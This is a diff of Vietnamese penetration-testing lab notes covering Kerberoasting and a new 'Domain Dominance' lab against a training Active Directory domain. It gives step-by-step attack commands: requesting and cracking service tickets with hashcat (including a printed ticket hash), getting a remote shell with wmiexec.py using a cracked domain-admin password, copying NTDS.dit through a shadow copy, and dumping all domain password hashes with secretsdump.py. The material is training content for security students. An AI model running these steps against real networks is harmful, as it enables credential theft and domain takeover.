@@ -5930,7 +5930,7 @@ Các máy ảo được sử dụng:
 
 Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Slingshot Linux:
 
-![alt text](IMG/LAB5/LAB5.1/imagE.png)
+![alt text](IMG/LAB5/LAB5.1/image.png)
 
 Trong trường hợp bạn đã chạy bài thực hành này trước đây, hãy cùng nhau dọn dẹp một chút. Chúng ta hãy xóa các tệp pot của JtR và Hashcat.
 
@@ -5947,7 +5947,7 @@ Chúng ta đã có được một bộ thông tin đăng nhập miền hợp l�
 
 Chú ý, chúng ta cần cấu hình DNS:
 
-![alt text](IMG/LAB5/LAB5.1/imagE-2.png)
+![alt text](IMG/LAB5/LAB5.1/image-2.png)
 
 Bước đầu tiên, chúng ta sẽ sử dụng tập lệnh Python GetUserSPNs.py, tập lệnh này sẽ thực hiện các bước sau:
 
@@ -5969,7 +5969,7 @@ Chúng ta sẽ sử dụng `GetUserSPNs.py` thư viện impacket. Chúng ta cầ
 GetUserSPNs.py hiboxy.com/bgreen:Password1 -request -dc-ip 10.130.10.10 | tee /tmp/spns.output
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-1.png)
+![alt text](IMG/LAB5/LAB5.1/image-1.png)
 
 ```bash
 $krb5tgs$23$*SVC_SQLService2$HIBOXY.COM$hiboxy.com/SVC_SQLService2*$c0c7991bffbefc7f00fe182aa426c0b4$81a097ceb9104845d89e32fda6cfd1f2254cac6ee7f6c7db0e998d39448f143fa8ac0f626addeec662eb91782ab35e2de6c4f8b47072981aa5957fda860aa2c988d18b5affc0db35de09b32de1930c0ebf50316ed33cac7b2725b54753fcd4b43b18c6cef272d0b416aa16af3ce03719346b5edfdfbda48291868d61040e0ea27d93fc8738edd09d31d48ca37b6132c4f2c417d9278af3e8823c16836468881ac4f7d3a442ffdd8ecea5e86014d3a97b2cac7ab87e82328e16c45b1e9b99c1e7c407f1c808faf2394e40de4aceb3a426ecec46e357c92e6200f8f220091db36697de0959c12ef443ace8e9edfc5d3b04f301be03c84f69bcfc1ab1171dffc29711789de3e3115e99cc817e705d5df90abb167e64f8da9443b2e51b3bce5522da0c74b89133c5379792ca77938817369b454a4c8ad5fe07738257764f1a312989b8428107058f50171d279b59281e2755b09924ca5b1921a794fd1e876f20516de565ef371fbba6771d6b60e1e1c062a11f945c0835538ce4f034ff34334ceda6da9470a260a16162f31fcad03dc98203bed9309995932e92405aaa6e540de6ac11f89688e63d8e6fa59b0ea5ccc840e7c5b127b36d3ba638a1802e9976b57ed2ea8c741e4d5323cb2dba12009c302ce6a8f087fd295bb8c182101af22d448faff511031a5672c1db2b68d560575f6778192a54d0984e22f654bbde50ce3b6e0d4caf038bf2a07303691a756de95751f1e5a0059293a87000028d791fe7d4fc65ec03c9fd8153a608e86d55422d80bdf109900900830e2e334d6717e219c3195ff27e9a74b29f1f2390d086593e87e07cf8003b272e36bd39447e9b6fc1b796abd0407f187a17e9f1a43b2981e70699a0f83628b075fb7d101b399b047022f147effd87ecf883988660fe484981323c498a28f85247a5b51a79048619c451bd5bbbe0dda9cbc298f7ec8c252540070ecd89fc6a3fc1491adcf6d1c411df4c96fcb7fae44356ade9904ce34fcccd90324cf1ce6a3039c2ea7c91c235f596a4d43e771d8e24a58141a82838a43c2778871563c4fae6e7d78a73c06e319599c44a9c0cfff0e728510c0b6d2d42b342581e9f2306c39a8975f05c7059639f8e22764a6882d364e412262f7d5db8473673756a007b8e092b4c705e5ea985788368ea17eb67e6c1d22753b08b4c137bb99a206324ceebef64028cf912b36c7fc33de69a67c504401496ec1441a5685afd714dfa4ce0fd108f37672b504e36ce362e5e2bf3ec3e745ec05f17f991339e87a94f88c1cb3f17fa9b68c8029745e8d36fd4c4c3ab8bb873f101f25a379a747344296fda03d227fc67e46bd37eb107f5ee685cbea1fcbb6ba725f11e9b3459ac00ab71a1778cb5a4963a0dd6a68e3f3fa92d237557f8fb607c6cc9f8f2a9704ef7d7e5bb2786f947aa75ac3097b0d3c12d5d39b5c56ed30dce7296be
@@ -6016,7 +6016,7 @@ Chúng ta hãy sử dụng các từ trong từ điển tiếng Anh và thêm m�
 hashcat -m 13100 -a 6 /tmp/tickets /opt/passwords/english-dictionary-capitalized.txt ?d
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-3.png)
+![alt text](IMG/LAB5/LAB5.1/image-3.png)
 
 Quá trình này sẽ chạy trong khoảng một phút, sau đó sẽ hiển thị mật khẩu của `Supercool7`.
 
@@ -6032,7 +6032,7 @@ hashcat -m 13100 -a 7 /tmp/tickets ?s /opt/passwords/english-dictionary-capitali
 
 Chúng tôi đã tìm thấy mật khẩu cho `SVC_SQLService2` tài khoản đó, và như bạn đã nhớ ở trên, đó là tài khoản của thành viên nhóm Quản trị viên tên miền!
 
-![alt text](IMG/LAB5/LAB5.1/imagE-4.png)
+![alt text](IMG/LAB5/LAB5.1/image-4.png)
 
 ### 4. Sử dụng thông tin đăng nhập bị đánh cắp
 
@@ -6066,7 +6066,7 @@ Chạy tập `wmiexec.py` lệnh bằng `whoami` lệnh:
 wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 whoami
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-5.png)
+![alt text](IMG/LAB5/LAB5.1/image-5.png)
 
 Tiếp theo, chúng ta có thể xác nhận mình đang ở trên Bộ điều khiển miền với tư cách là `svcsqlserver` tài khoản bằng cách sử dụng `hostname` lệnh. Chỉ cần nhấn phím mũi tên lên và thay thế `whoami` bằng `hostname`.
 
@@ -6074,7 +6074,7 @@ Tiếp theo, chúng ta có thể xác nhận mình đang ở trên Bộ điều 
 wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 hostname
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-6.png)
+![alt text](IMG/LAB5/LAB5.1/image-6.png)
 
 Bây giờ chúng ta hãy chạy net `user` lệnh. Thay vì gõ lại lệnh trước đó, hãy nhấn phím mũi tên lên để quay lại lệnh trước đó, sau đó dùng phím xóa (hoặc `Ctrl+W` để xóa cả một từ) để xóa `hostname` và gõ lại `net user`.
 
@@ -6084,7 +6084,7 @@ Chạy lệnh `wmiexec.py` này `net user` để lấy danh sách người dùng
 wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 net user
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-7.png)
+![alt text](IMG/LAB5/LAB5.1/image-7.png)
 
 Cuối cùng, chúng ta có thể chạy net `user` lệnh để xem nó `svcsqlserver` là thành viên của những nhóm nào:
 
@@ -6092,7 +6092,7 @@ Cuối cùng, chúng ta có thể chạy net `user` lệnh để xem nó `svcsql
 wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10 net user SVC_SQLService2
 ```
 
-![alt text](IMG/LAB5/LAB5.1/imagE-8.png)
+![alt text](IMG/LAB5/LAB5.1/image-8.png)
 
 Một trong những nhóm đó là nhóm "Quản trị viên tên miền"!
 
@@ -6105,3 +6105,193 @@ Cần lưu ý rằng một số công cụ khác cũng có thể được sử d
 Tóm lại, trong thí nghiệm này, chúng tôi đã xác định được một tài khoản dịch vụ được cấu hình với mật khẩu yếu. Chúng tôi đã yêu cầu một vé dịch vụ được mã hóa RC4, cho phép chúng tôi thực hiện tấn công vét cạn bằng hashcat. Cuối cùng, chúng tôi đã sử dụng tài khoản bị xâm phạm để giành quyền quản trị viên cấp độ miền trong môi trường.
 
 Tấn công Kerberoasting là một kỹ thuật tấn công cực kỳ hiệu quả, không dựa vào việc thiếu bản vá lỗi hoặc cấu hình sai và do đó có thể tạo ra "lối vào" trong các môi trường được bảo mật tương đối tốt!
+
+# Lab 5.2. Domain Dominance
+
+## Mục tiêu
+
+- Chúng tôi sẽ tạo một bản sao bóng của tệp NTDS.dit trên DC01.sec560.local (10.130.10.10)
+
+- Chúng tôi sẽ trích xuất bản sao từ DC01 về máy của chúng tôi.
+
+- Chúng tôi sẽ trích xuất các mã băm mật khẩu của toàn bộ thư mục Active Directory.
+
+## Thiết lập phòng thí nghiệm
+
+Máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Slingshot Linux:
+
+```bash
+ping -c 4 10.130.10.10
+```
+
+![alt text](IMG/LAB5/LAB5.2/image.png)
+
+Hướng dẫn thực hành từng bước
+
+## Hướng dẫn thực hành từng bước
+
+Chúng tôi sẽ truy cập vào DC cho miền sec560.local.
+
+Chúng tôi đã xâm nhập vào `SVC_SQLService2` một tài khoản có quyền quản trị miền trong phòng thí nghiệm Kerberoast.
+
+Vì tệp NTDS.dit đang được Active Directory sử dụng liên tục, nên không thể sao chép và dán trực tiếp vào ổ đĩa khác vì sẽ bị từ chối quyền truy cập. Do đó, chúng ta buộc phải tạo một bản sao của tệp và giải nén bản sao thay vì bản gốc. Để tránh các sự cố phức tạp, vì đây là môi trường chia sẻ, việc tạo bản sao KHÔNG nên được thực hiện nếu đã có bản sao tồn tại.
+
+### 1. Thiết lập shell trên DC01
+
+Xin nhắc lại, chúng tôi đã chiếm được tài `SVC_SQLService2` khoản và có thể sử dụng nó để thiết lập quyền truy cập từ xa vào bộ điều khiển miền.
+
+```bash
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.25
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-1.png)
+
+Nếu không chỉ định lệnh, chúng ta sẽ chuyển sang chế độ shell bán tương tác. Nếu cần thoát khỏi shell, hãy gõ `exit` (nhưng đừng làm vậy bây giờ).
+
+Có nhiều cách để tạo bản sao của tệp NTDS.dit. Trên thực tế, chúng ta đã sử dụng một công cụ có khả năng này, đó là [tên công cụ] `secretsdump.py`.
+
+Trong bài thực hành này, chúng ta sẽ sử dụng công cụ `vssadmin` để tạo bản sao bóng của ổ đĩa `C` (nơi chứa tệp NTDS.dit).
+
+### 2. Xem xét Shadow Copies
+
+Vì chúng ta đã có quyền truy cập wmiexec vào DC, hãy xem xét các bản sao bóng để xác định xem có bản chụp nhanh nào không.
+
+Trong `wmiexec.py` cửa sổ dòng lệnh, hãy liệt kê các bản sao bóng (shadow copies):
+
+```bash
+vssadmin.exe list shadows
+```
+
+Nếu bạn không thấy bản sao lưu nào, hãy tạo một bản. Nếu bạn thấy một bản, thì bạn có thể tạo một bản mới hoặc sử dụng bản sao lưu hiện có!
+
+> Không tồn tại Shadow Copy
+
+![alt text](IMG/LAB5/LAB5.2/image-2.png)
+
+Nếu bạn xem kết quả ở trên, bạn sẽ thấy không có bản sao bóng (shadow copy) nào và bạn sẽ phải tạo một bản sao bóng ở Bước 3.
+
+> Tồn tại shadow copy
+
+Bạn có thể thấy kết quả hiển thị như thế này. Nếu vậy, hãy ghi lại số ID của `HarddiskVolumeShadowCopyX` ; số của bạn có thể khác!
+
+![alt text](IMG/LAB5/LAB5.2/image-4.png)
+
+Trong sách có mà đây không có bản sao nào.
+
+### 3. Tạo Shadow Copy
+
+Nếu không có bản sao bóng (shadow copy), hãy tạo một bản sao bằng lệnh này:
+
+```bash
+vssadmin create shadow /for=c:
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-5.png)
+
+Hãy ghi lại số thứ tự của bản sao bóng mà bạn đã tạo. Trong ví dụ của chúng tôi, số thứ tự là 1, nhưng số của bạn có thể khác.
+
+```bash
+Successfully created shadow copy for 'c:\'
+    Shadow Copy ID: {9b259320-e24d-4f57-8168-95af954cb88d}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+```
+
+### 4. Tạo bản sao của NTDS.dit và System Hive
+
+Giờ chúng ta đã có bản sao lưu bóng của ổ C, chúng ta cần trích xuất tệp NTDS.dit từ đó.
+
+Lưu ý: Cập nhật số 1 thứ tự thành chỉ mục của bản sao bóng của bạn.
+
+```bash
+mkdir c:\extract
+mklink /d C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+```
+
+```bash
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\extract\ntds.dit
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-6.png)
+
+Để trích xuất mã băm từ tệp NTDS.dit, chúng ta cần khóa mã hóa trong registry hệ thống. Sao lưu registry bằng lệnh dưới đây (quá trình này có thể mất một hoặc hai phút để hoàn tất):
+
+```bash
+reg save hklm\system c:\extract\system /y
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-7.png)
+
+Chúng tôi đã thêm lệnh này `/y` để reg có thể ghi đè lên một tệp hiện có nếu tệp đó tồn tại. Nếu tệp đã tồn tại và chúng ta không thêm lệnh này `/y`, lệnh sẽ bị treo vô thời hạn.
+
+Bạn có thể đóng phiên này vì chúng tôi không còn cần đến nó nữa.
+
+### 5. Sao chép tệp NTDS.dit vào máy tính của bạn.
+
+Giờ đây, khi bản sao NTDS.dit và thư mục hệ thống đã có trên bộ điều khiển miền, chúng ta có thể sao chép chúng sang các máy của mình.
+
+Cách tốt nhất để sao chép các tập tin này là sử dụng `smbclient.py`.
+
+> ĐỪNG CHẠY CHƯƠNG TRÌNH NÀY!
+>
+> Các tập tin có dung lượng khoảng 70MB, và nếu tất cả sinh viên cùng tải xuống một lúc, nó có thể làm quá tải máy chủ DC. Chúng tôi đã cung cấp một bản sao của các tập tin này cho bạn trong thư ~/labsmục trên máy ảo Linux của bạn.
+
+```bash
+smbclient.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10
+use c$
+cd extract
+get ntds.dit
+get system
+exit
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-8.png)
+
+### 6. Trích xuất mã băm
+
+Giờ đây, khi đã có trong tay tập tin NTDS.dit, chúng ta có thể trích xuất bất kỳ mã băm mật khẩu nào mình muốn.
+
+Vì các thao tác trên tệp NTDS.dit được thực hiện trên máy tính cục bộ của chúng tôi, nên cuộc tấn công hiện đang ngoại tuyến và do đó không hiển thị trong bất kỳ nhật ký mạng nào.
+
+Sử dụng secretsdump.pyvới các tùy chọn sau:
+
+- `-ntdsntds`: ntds.dit_filename.
+
+- `-system`: system_filename.
+
+- `-outputfile`: output_filename.
+
+- `LOCAL`: Thông báo này cho `secretsdump.py` biết cuộc tấn công diễn ra cục bộ và chúng ta không truy cập thông tin đăng nhập từ xa.
+
+```bash
+secretsdump.py -ntds ~/labs/ntds.dit -system ~/labs/system LOCAL | tee /tmp/secretsdump_full.log less /tmp/secretsdump_full.log
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-9.png)
+
+Trong kết quả hiển thị ở trên, bạn có thể thấy kết quả của thao tác này. Chúng tôi cũng đã đánh dấu một mã băm sẽ hữu ích trong bài thực hành tiếp theo.
+
+Hiện tại, chúng ta có một vài lựa chọn:
+
+- Giải mã mật khẩu.
+
+- Truyền băm.
+
+- Sử dụng krbtgtmã băm cho các cuộc tấn công vé vàng.
+
+### 7. Bonus
+
+Nếu có thêm thời gian, hãy sử dụng Hashcat với các từ điển được cung cấp và các kỹ thuật đã học trong lớp để bẻ khóa mật khẩu. Bạn có thể thử nhiều kỹ thuật bẻ khóa khác nhau:
+
+- Từ điển thẳng.
+
+- Từ điển có hình mặt nạ.
+
+- Quy tắc.
+
+## Phần kết luận
+
+Trong bài thực hành này, chúng ta đã xem xét cách sử dụng người dùng miền có quyền quản trị để lấy bản sao của tệp NTDS.dit bằng cách sử dụng bản sao bóng (shadow copies). Sử dụng tệp này, chúng ta có thể trích xuất các mã băm mật khẩu cho bất kỳ người dùng hoặc tài khoản máy tính nào trong miền.
